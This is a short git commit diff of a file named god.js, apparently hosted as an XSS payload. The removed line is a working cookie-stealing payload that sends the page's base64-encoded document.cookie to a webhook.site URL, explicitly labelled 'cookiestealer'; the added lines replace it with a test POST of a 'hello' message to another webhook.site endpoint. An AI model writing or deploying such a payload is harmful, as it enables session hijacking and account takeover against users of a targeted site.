c0ad2843ef1e4dd414b4f791353225b470c977b5
mr7s3d0 <84435418+mr7s3d0@users.noreply.github.com>
2025-10-31 11:08:21 +0700

    teting

--- god.js
+++ god.js
@@ -1,1 +1,14 @@
-document.location='https://webhook.site/6eff0331-6c1d-4bb5-9521-8335ced7a82f/?cookiestealer='+encodeURIComponent(btoa(document.cookie));
+fetch("https://webhook.site/bed26aa0-5782-483e-881e-4d1fa0115c38", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({ message: "hello" })
+})
+.then(response => response.text())  // or .json() if your server returns JSON
+.then(data => {
+  console.log("Server response:", data);
+})
+.catch(error => {
+  console.error("Error:", error);
+});
